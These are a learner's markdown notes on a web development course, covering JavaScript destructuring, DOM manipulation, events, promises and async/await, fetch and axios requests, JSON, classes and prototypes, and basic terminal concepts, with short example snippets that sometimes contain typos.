ex. // {family:'Caninae',furry:true,isPet:true}

ex. const lion = {...feline,genus: 'Panthera'};
ex. // {legs:4, family: 'Falidae', genus:'Panthera'}

ex. const catDog = {...feline, ...canine );
ex. // {legs:4, family:'Caninae',furry:true}

<br>

#### 236. Rest Params
- The Arguments Object
: available inside every func.
: It's an **array-like** object
  ~> has a len. property
  ~> does not have array methods like push/pop
: contains all the arguments passed to the function
: **not available** inside of arrow func. (thus use rest params!)

: ex. function sumAll() {
          let total = 0;
          for (let i=0; i< arguments.length; i++){
              total += arguments[i];
          }
          return total;
      }

: ex. sumall(8,4,3,2); // 17

- cf. in Python,
  ex. import sys
      print(sys.argv)
  ex. >>>python example.py one two three
      ~> print(sys.argv)
      ~> ["example.py", "one", "two", 
      three"]

- however note again that arguments is NOT an array!
ex. function summation() {
          return arguments.reduce((total,el)=> total+el)
    }
~> does NOT work as arguments is not an array and cannot have an array method

- THIS IS WHERE **REST PARAMS** COMES INTO PLAY!
- Rest Params
: Collects all remaining arugments into an actual array

ex. function sumAll(...nums) {
        let total = 0;
        for (let n of  nums) total += n;
        return total;
    }

ex. sumAll(1,2,3,4); //10

ex. function raceResults(gold,...everyoneElse){
        console.log(everyoneElse);
    }

<br>

#### 237. Destructuring Arrays
- Destructuring
: a short, clean syntax to 'unpack':
  ~> values from arrays
  ~> properties from objects into distinct variables

- ex. const score = [182310293123,190482094,129033,18441,12933,1923];

  ex. const highScore = scores[0];
  ex. const secondHighScore = scores[1];
  
  ex. //faster way -> DESTRUCTURING
  ex. const [gold, silver] = scores;
  ex. gold; //182310293123
  ex. silver; //190482094

  ex. const [gold, ...others] = scores;
  ex. gold; // 182310293123
  ex. others; //[190482094,129033,18441,12933,1923]

<br>

#### 238. Destructuring Objects
- more common than destructuring arrays, as it does not have anything to do with the order!

- ex. const runner = {
        first: "Eliud",
        last: "Kipchoge",
        country: "Kenya"
      }
  ex. const {first,last} = runner;
  
  ex. first; //"Eliud"
  ex. last; // "Kipchoge"


- and if you want to rename,
  ex. const {first:newVarName}=runner;

- and to set default value,
  ex. const {first, last, team = 'JPMorgan'} = runner;

<br>

#### 239. Destructuring Params
- Param Destructuring
: we can destructure the values that are passed into the function as parameters

- ex. const fullName = ({first, last}) => {
        return  `${first} ${last}`
      }
      const runner = {
        first: "Eliud",
        last: "Kipchoge"
      }

- ex. fullName(runner); // "Eliud Kipchoge"

~> most frequently used with objects!

- ex. movies.filter(({score}) => score >=90);

<br>

## 24. Introducing the World of DOM
#### 240. What Matters In This Section
- Crucial
: Intro to the DOM
: querySelector
: getElementByid
: innerHTML and Text
: Changing Styles
: Creating/Removing Elements
: classList

- Important
: Traversing the DOM
: Manipulating Attributes

<br>

#### 241. Introducing DOM
- DOM
: Document Object Model

- What is it?
: the DOM is a JavaScript representation of a webpage.
: it's your JS "window" into the contents of a webpage
: it's just a bunch of objects that you can interact with via JS

<br>

#### 242. The Document Object
- a part of loading a webpage involves..
~> HTML + CSS go in..
~> JS objects come out (and the objects are linked to each other through data structure)
~> at the top of the data structure, the "root" is the "document" object

- console: type  console.dir(document) and can take a look into it

- Document
: the document object is our entry point into the world of the DOM. it contains representations of all the content on a page, plus tons of useful methods and properties

~> created automatically by a page based on the contents in the page.

- CodeAlong
: "selecting" codes

~> console - console.dir(document)
: can explore each "property" object
: ex. "b" tag (bold) itself is now an object

: ex. document.all
: ex. document.all[10] ~> <b>Silkie</b>
: ex. document.all[10].innerText ~> "Silkie"
: ex. document.all[10].innerText = "SLICKIE"  =>> changes the content!

~> thus, you can manipulate a lot using the Document Object!

<br>

#### 243. getElementById
- 1. Select
  2. Manipulate

- 1. Selecting
~> getElementById
   : the method that exists ON the document
   : and when you call it, you pass in the string
~> getElementsByTagName
~> getElementsByClassName

- ex. const banner = document.getElementById('banner')
  ~> gives you the img
  ex. console.dir(banner)
  ~> it's an object! which contains a lot of properties
  
  ~> returns the object representation of the element, which then you can manipulate

  <br>

#### 244. getElementsByTagName & className
- ex. const allImages = document.getElementsByTagName('img')
  ~> returns the **"HTML Collection"**

  ex. for(let image of allImages){
          console.log(image.src);
      }

- HTML Collection
: looks like an array but it is not an array
: though allImages[index], allImages.length, and For ... Of can be used
: but array methods are not applicable to this
: it is a collection of **elements**
: it is the most general base class from which all element objects (that represent elemtns) in a Document inherit. It only has methods and properties common to all kinds of elements, and more specific classes inherit from Element.

<br>

#### 245. querySelector & querySelectorAll
- querySelector
: a newer, all-in-one method to select a single element.

ex. //Finds first h1 element:
ex. document.querySelector('h1');

ex. //Finds first element with ID of red:
ex. document.querySelector('#red');

ex. //Finds first element with class of:
ex. document.querySelector('.big');

ex. document.querySelector('img:nth-of-type(2)')

ex. document.querySelector('a[title="Java"]')

<br>

#### 246. innerHTML, textContent,  & innerText
- there are so many! you can use

- some of the important ones...
~> classList
~> getAttribute()
~> setAttribute()
~> appendChild()
~> append()
~> prepend()
~> removeChild()
~> remove()
~> createElement
~> innerText
~> textContent
~> innerHTML
~> value
~> parentElement
~> children
~> style
~> nextSibling
~> previousSibling

- innerText & textContent
: texts inside

ex. document.querySelector('p').innerText = 'lololol'
~> changed the content!

- textContent=> shows ALL the contents(ex.hidden)

- innerHTML: shows the entire content including the HTML elements
~> useful when updating the contents

ex. document.querySelector('h1').innerHTML = '<i>jadlkfjlka</i>'

<br>

#### 247. Attributes
- can change attributes incl. id and class!

- ex. document.querySelector('#banner').id = "whoops"
  ~> changes the id, but it also disables the css setting that is on the previous id

- ex. const firstLink = document.querySelector('a')
  ex. firstLink.href
      ~> "file://wiki/List~~~~" (computed value taken from the JS Object!)
  ex. firstLink.getAttribute('href')
      ~> "/wiki/List~~~ "
  
  ~> so .getAttribute() is the *method* which goes through html itself to look for the html
     vs. .href is the property which goes through the JS Object

  ex. firstLink.setAttribute('href','http://www.google.com')

  <br>

#### 248. Changing Styles
- ex. const h1 = document.querySelector('h1');
  ex. h1.style

  ~> .style returns the CSSStyleDeclaration 
  ~> note. in CSS, we use '-' ex. text-align
      vs. in JS, '-' does not work and instead, camelCase is used ex.textAlign

  ~> but!! the object only contains *inline* styles specified

- Thus, unless we use in-line styles, the object does not contain the styles we specified in a separate css file, but we can still  **manipulate** the styles using this specific object!

~> however changing styles through this will **ONLY add the in-line styles**
: not a good idea!

~> rather add classes and manipulate those 

- the way to get the "computed" style after all the css sheets are applied
  ~> window.getComputedStyle(element)

<br>

#### 249. Classlist
- ex. const h2 =document.querySelector('h2')
  ex. h2.getAttribute('class')
      ~> null
  ex. h2.setAttribute('class','purple')
  ex. const currentClasses = h2.getAttribute('class')
  ex. h2.setAttribute('class',`${currentClasses} +'purple')

 ~> can be annoying to go through multiple steps if you don't want to override the current classes

- Thus use sth called  *classList*
  ex. h2.classList

  ~> an object to interact with to control and retrive the classes of the elments

  ex. h2.classList.add('purple')

  ex. h2.classList.remove('purple')
  ex. h2.classList.contains('purple')

  ex. h2.classList.toggle('purple')

<br>

#### 250.Traversing Parent/Child/Sibling
- could traverse among elements using relationships!
  ex.const firstBold = document.querySelector('b')
  ex. firstBold
      ~> <b>Silkie</b>
  ex. firstBold.parentElement
      ~> <p> ... </p>
  ex. firstBold.parentElement.parentElement
      ~> <body> ... </body>
  ex. firstBold.parentElement.parentElement.parentElement
      ~> the root element

- ex. paragraph.childresn
  ~> note that children might be multiple and you can select each with indices

- trasversing siblings!
  ~> .nextSibling / .previousSibling: gives you back the corresponding node (a lot of cases, \n text nodes
  ~> .nextElementSibling / .previousElementSibling: gives you back the element! 

<br>

#### 251. Append & AppendChild
- creating new elements from scratch and appending to the page

- How to make a new DOM element?
  : Document.createElement ( )
  ex. const newImg = document.createElement('img')
  ex. newImg.src = 'url'

  ~> now to append
  1. appendChild
  : document.body.appendChild(newImg)
  : append as the last child the page

  ex. const newH3 = document.createElement('h3')
  ex. newH3.innerText = 'akfdljdlkaf'
  ex. document.body.appendChild(newH3)

  2. append() / prepend()
  : newer, does not work in Explorer
  : syntax - ParentNode.append()

  ex. const p = document.querySelector('p')
  ex. p.append('i am new text yeahhh')
  ~> appended the new text! at the end of the paragraph

  : can add multiple

  3. insertAdjacentElement(position, elem.)
  : inserts a given element node at a given position rel. to the element it's invoked on
  : position - beforebegin / afterbegin / beforeend / afterend

  ex. const h2 = document.createElement('h2')
  ex. h2.append("Are adorable chickens")
  ex. h1.insertAdjacentElement( 'afterend', h2)

  4. after()
  : ex. const h3 = document.createElement('h3')
    ex. h3.innerText = 'I am h3'
    ex. h1.after(h3)

<br>

#### 252. removeChild & remove
1. Node.removeChild()
~> should call the parent to remove the specific ch.
ex. const firstLi = document.querySelector('li')

ex. firstLi.parentElement.removeChild(firstLi)

2. ChildNode.remove()
~> call the actual thing to be removed
ex. firstLi.remove()

<br>

#### 253. Pokemon Sprites Demo
- Reference code available!

<br>

## 25. DOM Events
#### 254. What Matters in This Section
- Crucial
: Introducing Events
: addEventListener
: Forms Events

- Important
: Keyboard Events
: Input & Change Events
: Event Bubbling
: Event Delegation

<br>

#### 255. Intro to Events
- Events
: responding to user inputs and actions!

- A Small Taste
: clicks, drags, drops, hovers, scrolls, form submission, key presses, focus/blur
: mouse wheel, double click, copying, pasting, audio start, screen resize, printing

<br>

#### 256. Inline Events


- there are three ways to respond to events

1. (not recommended) in-line HTML Event Handler Attribute
  : onclick="~"
  : syntax is confusing, and need to duplicate codes if you want the same function for multiple

<br>

#### 257. The Onclick Property

2. Use JS to set the onclick(or other) property(ies)
  ex. const btn = document.querySelector('button')
  ex. btn.onclick = function() {
          console.log("YOU CLICKED ME!");
          console.log("I HOPE IT WORKED!");
      }

  ~> easier to duplicate (ex. can set up the loop and assign .onclick property to each)

  ex. function yell(){
          console.log("yeahhhhhhh");
      }
  ex. btn.onmouseenter = yell;
      //NOTE. you are just defining the function, and only when the event occurs, the function is **executed**

  
  ex. document.querySelector('h1').onclick = () => {
          alert('you clicked the h1 !')
      }

<br>

#### 258. addEventListener
- the best Option!

- addEventListener
  : specify the event type and a callback to run
  ex. const button =  document.querySelector('h1');
  ex. button.addEventListener('click', () => {
          alert("You clicked me!!")
      })

- Better than the other two because
  1. .onclick (2nd way) style can only designate one function i.e. one property

  2. and there are options you can include ex. .addEventListener('onclick', function,{once:true});

  3. companion method:  .removeEventListener

<br>

#### 259. Random Color Exercise
- code available!

<br>

#### 260. Events & The Keyword "This"
- ex. function colorize() {
        this.style.backgroundColor = makeRandColor();
        this.style.color = makeRandColor()
      }
      ~> note again that the keyword 'this' depends on the scope the function is created in

<br>

#### 261. Keyboard Events & Event Objects
1. Event Objects
- ex. document.querySelector('button').addEventListener('click', function (evt) {
        console.log(evt)
      })
      ~> when this is coded, there is a thing that's *automatically* passed into the callback function => Event Object (evt in this example)

- keyboard objects
  : code, and key are the important ones
  : ex. shift - there are left and right shifts
  : ex. keys - q / ㅂ, code - keyQ

<br>

#### 262. Form Events & PreventDefault
- when we submit (i.e. click button), let's stop the action to go to another page, and rather do something on the same page

- first gotta create an object of the form, to listen to the events happening with it

- ex. const tweet = document.querySelector('#tweetForm');
  ex. tweet.addEventListener('submit',function(e) {
          console.log("SUBMIT!")


          e.preventDefault();
  });

- inputObject.value: whatever is in the input


- Rather, if you assign 'names' to elements inside the form,
  ex. tweetForm.elements.username (when the input name is 'username')

<br>

#### 263. Input & Change Events
- example - wants update every time the input is updated

- ex. input.addEventListener('change', function(e){})
  ~> 'change': only applied when you leave the input
  ex. input.addEventListener('input',function(e){})
  ~> 'input': happens everytime the input changes
  ~> can be useful for preview & whatnot!

<br>

#### 264. Event Bubbling
- all the events bubbled up by elements will run
  ~> to stop the execution of further events, .stopPropagation()

<br>

#### 265. Event Delegation
- example file - deleting list items using
  for (li in lis) {
    li.eventListener('click',function(e){
        li.remove;
    })
  }
  works for the list items, which were already there, at the time 'const li's were defined
  : however, the new list items added don't get assigned to lis and it does not work
  : thus, we will assign the event listener to the parent element.

- ex. tweetsContainer.addEventListener('click',function(e){
        //target is set to the specific <li>  clicked
        
        // if the clicked element is <li>, remove the target
        e.target.nodeName === 'LI' && e.target.remove();
      })

<br>

## 26. Score Keeper CodeAlong
#### 266. Score Keeper
- "Bulma": similar to Bootstrap, another CSS framework
  : does not require jqery!!!

- we will use 'card' format 

<br>

#### 269. Score Keeper Refactoring
- to reduce duplicates, objects will be used

<br>

## 27. Async JavaScript: Oh Boy!
#### 270. What Matters In This Section
- Crucial
: Working With Promises
: Async Functions

- Important
: The Call Stack
: Callback Hell

- Nice To Have
: Understanding WebAPI's
: Creating Our Own Promises

<br>

#### 271. Call Stack
- Call Stack
: The mechanism the JS interpreter uses to keep track of its place in a script that calls multiple functions.
: How JS "knows" what function is currently being run and what functions are called from within that function, etc.

- How it works
1. When a script calls a function, the interpreter adds it to the call stack and then starts carrying out the function

2. Any functions that are called by that function are added to the call stack further up, and run where their calls are reached

3. When the current function is finished, the interpreter takes it off the stack and resumes execution where it left off in the last code listing!

- reference
~> loupe
   :isTriangle Demo
   => http://latentflip.com/loupe/?code=ZnVuY3Rpb24gbXVsdGlwbHkoeCx5KSB7CiAgICByZXR1cm4geCAqIHk7Cn0KCmZ1bmN0aW9uIHNxdWFyZSh4KSB7CiAgICByZXR1cm4gbXVsdGlwbHkoeCx4KTsKfQoKZnVuY3Rpb24gaXNSaWdodFRyaWFuZ2xlKGEsYixjKXsKICAgIHJldHVybiBzcXVhcmUoYSkgKyBzcXVhcmUoYikgPT09IHNxdWFyZShjKTsKfQoKaXNSaWdodFRyaWFuZ2xlKDMsNCw1KQ%3D%3D!!!

~> chrome - sources

<br>

#### 272. Web APIs & Single Threaded
- JavaScript is Single-Threaded
: At any given point in time, that single JS thread is running at most one line of JS code

- fortunately...we have a workaround
  ex. console.log("Sending request to server!")
      setTimeout(() => {
          console.log("Here is your data from the server...")
      }, 3000)
      console.log("I am at the end of the file!")
  
  ~> "Sending request to server!"
     "I am the end of the file!" => the browser (C++) sets the timer and tells  JS to 
     "Here is your data from the server.."

- The **browser** does the work! (not JS)
: Browsers come with Web APIs that are able to handle certain tasks in the background (like making requests or setTimeout)
: The JS call stack recognizes these Web API functions and passes them off to the browser to take care of
: Once the browser finishes those tasks, they return and are pushed onto the stack as a callback.

- reference - loupe again!
  : setTimeOut Demo
  => http://latentflip.com/loupe/?code=Y29uc29sZS5sb2coIlNlbmRpbmcgcmVxdWVzdCB0byBzZXJ2ZXIhIikKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgIGNvbnNvbGUubG9nKCJIZXJlIGlzIHlvdXIgZGF0YSBmcm9tIHRoZSBzZXJ2ZXIuLi4iKQp9LCAzMDAwKQpjb25zb2xlLmxvZygiSSBBTSBBVCBUSEUgRU5EIE9GIFRIRSBGSUxFISIp!!!

<br>

#### 273. CallBack Hell :(
- Nesting setTimeout() function to make events consecutive

- It is incredibly a common practice to nest so many callbacks, in case it doesn't work, if API is down or request failed, etc., etc....

  => "Callback Hell"
  
~> Async to come!!

<br>

#### 274. Demo: fakeRequest using Callbacks
- Enter Promises
: A Promise is an object representing the eventual completion or failure of an asynchronous operation

- ex. // THE CALLBACK VERSION
        const fakeRequestCallback(url, success, failure){
          const delay = Math.floor(Math.random * 4500)+500;
          setTimeout(() => {
            if (delay > 4000){
              failure("Connection Timeout :(")
            } else {
              success ("Here is your fake data from ${url})
            }
          }, delay)
        }

- Note that if you want to execute something ONCE one thing is run, you have to NEST it. ~> can yield to multiple nested success/fail callbacks

<br>

#### 274. Demo: fakeRequest Using Promises
- Promises: newer, and not supported in Internet Explorer

- ex. const fakeRequestPromise ('url') => {
        return new Promise((resolve, reject) = {
            const delay = Math.floor(Math.random() * 4500) + 500;
            setTimeout(() => {
              if (delay > 4000){
                reject('Connection Timeout :(')
              }
              else {
                resolve('Here is your fake data from ${url})
              }
            }
        }
      }

- ex. let res = fakeRequestPromise('hikingtrails.com/api/nearme')
~> gives back the "Primise" Object

- Promise status: pending / fulfilled (resolved, success) / rejected (failure)

- Fulfill / Reject
  : A promise is a returned object to which you attach callbacks, instead of passing callbacks into a function

- NOTE. if 'fulfill'd, use *then*
  NOTE. if 'reject'ed, use *catch*

  ex. fakeRequestPromise('yelp.com/api/coffee')
        .then(() => {
            console.log("Promise Resolved!");
            console.log("It worked!!!!");
        }).catch(() => {
            console.log("Promise Rejected!");
            console.log("Oh No, Error!!!");
        })

- when there become multiple levels of promise requests...
  ex. fakeRequestPromise('yelp.com/api/coffee/page1')
          .then(() => {
              console.log("Promise Resolved! (1)")
              console.log("It worked! (1)")
              fakeRequestPromise('yelp.com/api/cofee/page2')
                  .then(() => {
                      console.log("Promise Resolved! (2)")
                      console.log("It worked! (2)")
                  })
                  .catch(() => {
                      console.log("Promise Rejected! (2)")
                      console.log("Oh no error!(2)")
                  })
          })
          .catch(() => {
              console.log("Promise Rejected! (1)")
              console.log("Oh No, Error! (2)")
          })


  ~> Merely chaining Promises is not significantly better than the callback hell!

<br>

#### 276. The Magic Of Promises
- With the Promise, you can actually return the Promise itself, instead of using .then()

  ex. fakeRequestPromise('yelp.com/api/coffee/page1')
          .then((data) => {
                console.log("It worked! (page1)")
                console.log(data)
                return fakeRequestPromise('yelp.com/api/coffee/page2')
          })
          .then((data) => {
                console.log("It worked! (page2)")
                console.log(data)
                return fakeRequestPromise('yelp.com/api/coffee/page3')
          })
          .then((data) => {
                console.log("It worked! (page3)")
                console.log(data)
          })
          .catch((err) => {
                console.log("Oh no, a request failed!")
                console.log(err)

          })
  
  ~> Returning the "fulfilled" promise and chaining
  ~> anytime the request fails (rejected), it falls through and goes to .catch

  ~> you can pass in the data too

<br>


#### 277. Creating Our Own Properties
- Syntax
  : new Promise(resolve, reject) => {
        resolve();
    }

  : Promise Object always takes **two parameters!**
  : one for fullfillment, and the other for failure cases

- ex. const fakeRequest = (url) => {
          return new Promise((resolve, reject) => {
              const rand = Math.random();
              setTimeout(() => {
                  if (rand < 0.7){
                      resolve('YOUR FAKE DATA HERE'); 
                  }
                  reject('Request Error!');
              }, 1000)
          })
      }

      fakeRequest ('/dogs/1')
          .then((data) => {
              console.log("Done with Request!")
              console.log("data is: ", data)
          })
          .catch((err) => {
              console.log("Oh No! ",err)
          })

- ex. color change codes using (1) Callback and (2) Promise

<br>

#### 278. Async Keyword
- Async Function
  : A newer and cleaner syntax for working with async code!
  : Syntax "makeup/sugar" for promises (making syntax prettier and cleaner!)

- Two Pieces
1. Async
2. Await

- Becuase these two simplify codes a lot, we will use these further along
- While *understanding* Promises is crucial too!

- The async keyword
: Async functions always return a promise
: If the function returns a value, the promise will be resolved with that value

: If the function throws an exception, the promise will be rejected

ex. async function hello() {
        return 'Hey guy!';
    }
    hello();
    //Promise {<resolved>: Hey guy!}
    async function uhOh() {
        throw new Error('oh no!')
    }
    uhOh();
    //Promise {<rejected>: Error: oh no!}

ex. const sing = async () => {
    }
    ~> <pending> promise returned

ex. const login = async (username, password) => {
      //if missing any of them
      if(!username || !password) throw 'Missing Credentials'

      if (password === 'corgifeetarecute') return 'welcome!'
      throw 'Invalid Password'
    }

    login('username', "corgifeetarecute)
      .then(msg => {
          console.log("LOGGED IN!")
          console.log(msg)
      })
      .catch(err => {
          console.log("Error!")
          console.log(err)
      })

    ~> "LOGGED IN!" \n "welcome!"

<br>

#### 279. The Await Keyword
- The await keyword
  : await will pause the execution of the function, waiting for a promise to be resolved
- ex. for the color change function,

  ex. async function rainbow(){
          await delayedColorChange('red',1000) //returns a Promise
          //'await' pauses executions until the code returns a Promise
          await delayedColorChange('orange',1000)

          return "ALL DONE!"
          //this async function itself will return a promise, in this case a resolved promise saying "ALL DONE!"
      }

  ex. async function printRainbow() {
          await rainbow();
          console.log("End of rainbow!")
      }

      printRainbow()

- very very common pattern!
  ex. async function makeTwoRequests() {
          let data1 = await fakeRequest('/page1');
          console.log(data1);
      }

<br>

#### 280. Handling Errors in Async Functions
- To handle errors in async functions, **try and cath** is the good solution! (when an error results in the codes after where the error occurs, might not even run)

  ex. async function makeTwoRequests() {
      try {
          let data1 =await fakeRequest('/page1');
          let data2 =await fakeRequest('/page2');
          console.log(data1);
      } catch(e){
          console.log("caught an error!", e)
      } 
      }

<br>

## 28. AJAX and APIs
#### 281. What Matters In This Section
- Crucial
: Working With API's
: Intro to JSON
: Working With Axios

- Important
: Postman
: The Fetch API

- Nice To Have
: Making XHRs

<br>

#### 282. Intro to AJAX
- AJAX
: Asynchronous
: JavaScript
: And
: XML

- Asynchronous & JavaScript ~> basically making requests to load, send, or save info behind the scene seamlessly on a given website/application, interacting with the server somewhere

- creating something where using JavaScript, we can load, fetch, send data, or save progress to db, and others, behind the scene (Vs. in the past havin had to load a new page, etc.)
~> ex. on Chrome,  Developer Tool - Network => can see that all sorts of requests are being made when you scroll down a Reddit page

<br>

#### 283. Intro to APIs
- API or Appilcation Programming Interface
: actually a very broad term. A sort of interface for one software to communicate with another piece of software!

- Web APIs
: interfaces which are web-based(http-based)
: interact with 'endpoints' which ususally are urls

- ex. cryptonator.com

  ex. openweathermap.org/current

  ex. developer.twitter.com

  ex. developers.instagram.com

  ex. developers.facebook.com

  ex. twilio.com

  ~> returns JSON

- vs. when you take info from a page using 'source' you also get tons of html & css, which you have to filter
- API comes in handy, when you only need the data

<br>

#### 284. WTF is JSON
- XML: Extensible Markup Language
  : used to be dominant!

- So these days, we can say "AJAJ"

- JSON
: Java
: Script
: Object
: Notation
=> but not the same as JS at all!

~> just a format of transferring data

ex. {
      "productName": "soup",
      "market": "convenience store",
      "popularity": "high"
  }

~> note that *every key* has to be a *double-quoted string*

- reference: json.org/json-en.html

- since all elements are quoted strings in JSON, we gotta parse them in a correct way so that we can use them
=> JSON.parse()

ex. const data = `some JSON`
ex. JSON.parse(data)
ex. JSON.parse(data).ticker.price

- the other way i.e. converting JS to JSON
=> JSON.stringfy

ex. const dog = {breed:'lab', color: 'black', owner: undefined}

ex. JSON.stringfy(dog)
    ~> {"breed": "lab","color":"black"}

- JSON docs
: https://www.json.org/json-en.html

- JSON Formatter & Validator
: https://jsonformatter.curiousconcept.com/

<br>

#### 285. Using Postman
- HTTP request!!!

- for this, we will use a tool called "postman"
- Postman
: https://www.postman.com/downloads/
: very common to web developers
: download

~> on its desktop version,
ex. you can send a GET request, and see HTML / CSS / JS of the website

~> Postman's strength highlights when APIs are used
ex. Cryptocurrency API
ex. https://api.cryptonator.com/api/ticker/btc-usd

- status code!
~> represents the status of the server
ex. 200 OK
ex. 404 Not Found
ex. 405 Not Allowed (POST request is not supported by this server)

~> starting with 2
: good overall
~> starting with 3
: redirection messages

~> starting with 4
: client error responses

~> starting with 5
: server error resopnses

- header contains a bunch of information

- TV Show API
: https://www.tvmaze.com/api

<br>

#### 286. Query Strings & Headers
- ":" means a variable! ex. /search/shows?q=:query
- "?q=:query" ~> an example of **query strings**
~> a way of providing additional information

- ex. https://icanhazdadjoke.com/api

- Postman: can set a header too
: ex. if you set a header to include application/json, you get json instead of html from the jokes website

<br>

#### 287. Making XHR's
- Old way of setting a Request
~> XMLHttpRequest
: the "original" way of sending requests via JS
: does not support promises, so... A LOT of callbacks!
: WTF is going on with the weird Capitalization? Clunky syntax that I find difficult to remember!

ex. const myReq = new XHLHttpRequest(); //New Request Object
    myReq.onload = function(){
        const data = JSON.parse(this.responseText);
        console.log(data);
        // Attach onload callback on that Object 
    };

    myReq.onerror = function(err) {
        console.log('ERROR',err);
        // Attach error callback on that object
    };

    myReq.open('get', 'https://icanhazdadjoke.com/',true);
    // Get a request

    myReq.setRequestHeader('Accept','application/json');

    myReq.send();
    // Send the request

  
~> syntax complexity and requiring lots of callbacks when you want to send multiple requests, etc

<br>

#### 288. The Fetch API
- Fetch API
: A newer way of making a HTTP request using JS
: Support promises!
: Not suppored in Internet Explorer

ex. fetch('https://api.cryptonator.com/api/ticker/btc-used')
      // ~> gives back a Promise
      .then(res =>{
          console.log("Response, Waiting to Parse", res)
          return res.json()
      })
      // *NOTE!*
      .then(data => {
          console.log("Data parsed...",data)
      })
      .catch(e =>{
          console.log("Oh no! Error!", e)
      })

~> One thing annoying about fetch: We don't actually have the data just yet

~> Fetch is going to RESOLVE a PROMISE and triggerring .then, **as soon as** it receives a header coming back from the API, before everything has been transferred

~> *NOTE!* : thus chain .then to wait until all the data is transferred , and make data parsed as JSON

- Still could be confusing! with lots of work
~> library like Axios comes in handy

- ex. const fetchBitcoinPrice = async() => {
          const res = await fetch('https://api.cryptonator.com/api/ticker/btc-usd')
          const data = await res.json();
          console.log(data.ticker.price)
      }

      ~> a simpler version
      ~> still built upon fetch!

<br>

#### 289. Intro to Axios
- Axios
: A library for making HTTP requests
: https://github.com/axios/axios

- https://www.cryptonator.com/api/

-include
: <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script> before the app.js
: because in the app.js, we will use the axios library


- Most important method: axios.get()
~> you get data at once! does not require multiple steps

ex. axios.get('https://api.cryptonator.com/api/ticker/bcn-usd')
    .then(res =>{
        console.log(res.data.ticker.price)
    })

<br>

#### 290. Setting Headers With Axios
- Recall. the dad joke site! ~> if you just fetch using the entire url, you get html with too much information
~> when you specify application - application/json header, you get filtered data

- NOTE. the second argument for axios.get(): can specify options ex. header

ex. const getDadJoke = async () => {
        const config = {headers: {Accept: 'application/json'}}
        const res = await axios.get('https://icanhazdadjoke.com/')
}

<br>

#### 291. TV Show Search App
- TV Maze endpoint 
- Reference

<br>

## 29. Prototypes, Classes, & OOP
#### 292. What Matters In This Section
- Crucial
: Object Prototypes (the concept)
: Defining Classes
: Extends and Super

- Important
: The " new" keyword (the 4 things it does)

- Nice To Have
: Defining the Constructor Functions(the "old" way)
: Converting Colors and Associated Crazy Math

<br>

#### 293. What On Earth Are Prototypes
- Object-Oriented Programming (OOP)
- Object Prototype
: __proto__ ~> references the prototype

- Prototype ~> kind of a template object
~> contains lots of methods

- ex. Array.prototype

- you can add your own method
ex. method called "grumpus"
ex. String.prototype.grumpus = () => alert("go away!")

- ex. String.prototype.yell = function() {
        return `${this.toUpperCase()}!!!!!`
    }

- but not really recommended to add functions to prototype
~> these are rather for demonstration

- ex. Array.prototype.pop = function(){
      return "Sorry I want that element, I will never pop it off!"
    }

- Overriding a prototype method is also possible

- Note.
: something.prototype ~> actual prototype object
: \__proto__~> "reference" to that object

<br>

#### 294. Intro to Object Oriented Programming
- "Organizing" our codes! ~> is the key

<br>

#### 295. Factory Functions
- ex. function hex(r,g,b){}
~> converts the rgb color into the hex color

- Factory Function: to make an object that automatically has the specified methods and stores variable values as properties on that object

- ex. function makeColor(r, g, b){
        const color = {};
        color.r = r;
        color.g = g;
        color.b = b;

        color.rgb = function(){
          console.log(this)
          //here, this refers to the object created
          
          const {r, g, b} = this;
          return `rgb(${r},${g},${b})`
          //this way, we dont need to call as this.r, this.g, this.b
        }

        color.hex = function(){
          const {r,g,b} = this;
          return '#' + ((1<<24) + (r<<16) + (g<<8) + b).toString(16).slice(1);

        return color;
      }
  
  ex. makeColor(255, 255, 255)
  ~>{r: 255, g: 255, b: 255}

<br>

#### 296. Constructor Functions
- Factory Function ~> not commonly used!
~> Constructor Functions are more common

- drawback of the **factory functions**
: you get to have the UNIQUE copies of functions for each object

ex. const black = makeColor(0,0,0)
ex. const firstColor = makeColor(35, 255, 150)
ex. black.hex === firstColor.hex ~> false! [referring to the different locations]

ex. "hi".slice === "hello".slice ~> true!!

- ex. [1, 2, 3, 4] ~> the method pop is not defined in this object, but is defined in \__proto__ instead!

- Constructor Function
: cf. *new operator* ~> lets developers create an instance of a user-defined object type / an instance of a built-in object type that has a constructor function

ex. function Color(r, g, b) { //capitalized to show that it isn't a regular function
        this.r = r;
        this.g = g;
        this.b = b;
        console.log(this);
    }

ex. new Color(255, 40 , 100)
~> r, g, b as properties
~> and \__proto__ including constructor

~> without the *new* keyword, *this* would refer to the window object
~> with the *new* keyword though, it behaves differently! creates an object and links to another

- to define methods to the prototype, not each object,
~> define outside that constructor

ex. Color.prototype.rgb = function() {
        const {r, g, b} = this;
        return `rgb(${r}, ${g}, ${b})`;
    }

ex. color1.hex() ~> color1 (on the left side of hex())will be the value of *this*

- NOTE: you do **not** want to use **arrow function** for this, as this keyword behaves differently.

<br>

#### 297. JavaScript Class
- Achieves the same thing as Constructor but has much prettier syntaxes!![Syntatic Sugar]

- Major improvement: you don't need to separate the (1) constructor and (2) methods

- ex. class Color {
          //we always add in a constructor!
          constructor(r,g,b){
              console.log(r,g,b);
            
          }
}

- Constructor: a function that will execute whenever new Color is created!

<br>

#### 298. More Classes Exercise
- code: color into hsl
- hsl: hue (0 - 360), saturation (0 - 100%), lightness(0 - 100%)!

<br>

#### 299. Extends and Super Keywords
- separate class with **constructor**
- Then extend it!
- ex. class Cat extends Pet {}

- you can override

- *Super*: References the class that we are extending from
  ex. class Cat extends Pet{
          constructor(name,age,breed){
                super(name,age);
                this.breed = breed;
          }
  }

<br>

## 30. Mastering The Terminal
#### 300. What Matters In This Section
- Crucial!
: LS
: CD
: MKDIR
: RM
: Touch
: PWD
: Installation
: Relative vs. Absolute Paths

- Important
: Remembering All The Commands

<br>

#### 301. Backend Overview
- Creating a server, completing database, etc...

<br>

#### 302. A Pep Talk On Terminal

- text-based prompt

<br>

#### 303. Why Do We Need To Know Terminal Commands?
- Speed!
: Develop Faster
: The terminal takes some getting used to, but it can be MUCH faster than using a GUI

- Access
: With Great Power...
: the terminal provides a "mainline" into the heart of our computer, giving us access to areas we normally do not interact with

- Tools!
: Many of the tools we need are installed and used via the command line. We don't have much of a choice!

- Confusing Terminology!
1. Terminal
: A text-based interface to your computer. Originally a physical object, but now we use software terminals


2. Shell
: The program that runs on the terminal

3. Bash
: One of the most popular shells (and the default on a mac)

4. ZShell
: One of the most popular shells along with Bash shells (zsh)

- you can swap between shells in the terminal

<br>

